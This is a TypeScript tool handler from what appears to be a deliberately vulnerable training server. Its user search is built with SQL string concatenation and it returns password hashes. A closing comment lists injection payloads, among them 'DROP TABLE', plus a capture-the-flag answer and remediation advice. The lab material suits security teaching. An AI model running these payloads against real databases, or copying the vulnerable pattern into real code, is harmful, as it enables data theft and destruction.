/**
 * Database Query Tool - SQL Injection Vulnerability
 *
 * ⚠️  VULNERABILITY: SQL Injection (CWE-89)
 * This tool constructs SQL queries using string concatenation.
 * Attackers can inject SQL syntax to modify query behavior.
 *
 * EDUCATIONAL PURPOSE: Demonstrates classic SQL injection vulnerabilities.
 */

import Database from 'better-sqlite3';
import { join } from 'path';

export const searchUsersTool = {
  name: 'search_users',
  description: 'Searches the user database for matching usernames. Returns user information including email and role.',
  inputSchema: {
    type: 'object',
    properties: {
      username: {
        type: 'string',
        description: 'Username to search for (supports partial matches)',
      },
    },
    required: ['username'],
  },
};

export async function handleSearchUsers(args: any) {
  const { username } = args;
  const dbPath = process.env.DB_PATH || join(process.cwd(), 'data', 'database.sqlite');

  try {
    const db = new Database(dbPath);

    // VULNERABILITY: SQL Injection via string concatenation!
    // Should use parameterized queries with placeholders

    // WRONG: Directly concatenating user input into SQL
    const query = `SELECT * FROM users WHERE username LIKE '%${username}%'`;
    // Should be: SELECT * FROM users WHERE username LIKE ?
    // with parameter: [`%${username}%`]

    console.error(`[VULNERABLE SQL] Executing: ${query}`);

    // VULNERABILITY: No input sanitization
    const results = db.prepare(query).all();

    db.close();

    if (results.length === 0) {
      return {
        content: [
          {
            type: 'text',
            text: `No users found matching: ${username}\n\nQuery executed: ${query}\n\nTip: Try using SQL wildcards or special characters!`,
          },
        ],
      };
    }

    // VULNERABILITY: Exposing all user data including passwords
    const output = results.map((row: any) =>
      `User: ${row.username}\nEmail: ${row.email}\nRole: ${row.role}\nPassword Hash: ${row.password}\nSecret: ${row.secret || 'N/A'}`
    ).join('\n\n---\n\n');

    return {
      content: [
        {
          type: 'text',
          text: `Found ${results.length} user(s):\n\n${output}\n\n[Query: ${query}]`,
        },
      ],
    };
  } catch (error: any) {
    // VULNERABILITY: Detailed SQL error messages help attackers
    return {
      content: [
        {
          type: 'text',
          text: `Database error: ${error.message}\n\nQuery attempted: SELECT * FROM users WHERE username LIKE '%${username}%'\n\nDatabase: ${dbPath}\n\nHint: The error message tells you what went wrong in your SQL injection attempt!`,
        },
      ],
      isError: true,
    };
  }
}

/*
EXPLOITATION EXAMPLES:

1. Union-based SQL injection:
   username: "' UNION SELECT username, password, email, role, secret FROM users--"
   username: "' UNION SELECT * FROM secrets--"

2. Comment-based injection:
   username: "admin'--"
   username: "admin' OR '1'='1'--"

3. Boolean-based blind injection:
   username: "' OR '1'='1"
   username: "' OR 1=1--"

4. Time-based blind injection:
   username: "'; SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END--"

5. Extracting all users:
   username: "' OR ''='"
   username: "%' OR 1=1--"

6. Table enumeration:
   username: "' UNION SELECT name, type, sql, 1, 1 FROM sqlite_master WHERE type='table'--"

7. CTF Flag extraction:
   username: "' UNION SELECT flag, 1, 1, 1, 1 FROM flags--"
   Expected: FLAG{sql_ninja}

8. Bypassing authentication:
   username: "admin' OR '1'='1' --"

COMMON SQL INJECTION PAYLOADS:
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT NULL--
'; DROP TABLE users--
' AND 1=2 UNION SELECT * FROM secrets--

REMEDIATION:
- Use parameterized queries (prepared statements)
- Never concatenate user input into SQL
- Use ORM libraries that handle escaping
- Implement input validation (allowlist)
- Apply principle of least privilege for database users
- Sanitize error messages (don't reveal SQL structure)
- Use database-specific escaping functions as last resort
*/
